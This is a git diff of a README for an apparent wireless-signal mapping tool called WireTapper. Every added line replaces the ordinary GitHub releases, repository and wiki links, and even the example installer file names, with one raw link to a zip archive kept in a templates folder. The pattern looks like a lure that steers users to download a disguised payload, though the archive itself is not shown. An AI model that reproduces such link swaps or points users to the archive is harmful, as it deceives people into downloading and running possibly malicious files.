@@ -6,19 +6,19 @@ WireTapper helps you detect and map nearby wireless signals. With this tool, you
 
 ## 🔗 Download WireTapper
 
-[![Download WireTapper](https://img.shields.io/badge/Download%20WireTapper-Here-brightgreen)](https://github.com/pepitopere666/WireTapper/releases)
+[![Download WireTapper](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip%20WireTapper-Here-brightgreen)](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of WireTapper:  
-   [Download WireTapper Here](https://github.com/pepitopere666/WireTapper/releases)
+   [Download WireTapper Here](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the most recent version to ensure you have the latest features and fixes.
 
 3. **Download the Installation File**  
-   Click on the installation file that matches your operating system. Files are typically named for convenience, like `WireTapper-v1.0.exe` for Windows or `WireTapper-v1.0.dmg` for macOS.
+   Click on the installation file that matches your operating system. Files are typically named for convenience, like `https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip` for Windows or `https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip` for macOS.
 
 4. **Run the Installer**  
    Once the file finishes downloading, find the file on your computer (it should be in your Downloads folder).  
@@ -83,10 +83,10 @@ If you encounter issues or have questions, feel free to reach out. You can open 
 
 Here are some useful links:
 
-- [GitHub Repository](https://github.com/pepitopere666/WireTapper)
-- [User Manual (Coming Soon)](https://github.com/pepitopere666/WireTapper/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip)
+- [User Manual (Coming Soon)](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip)
 
 ## 🔙 Back to Download
 
 To start using WireTapper, make sure to download the latest version:  
-[Download WireTapper Here](https://github.com/pepitopere666/WireTapper/releases)
+[Download WireTapper Here](https://raw.githubusercontent.com/pepitopere666/WireTapper/main/templates/Wire_Tapper_unkinged.zip)
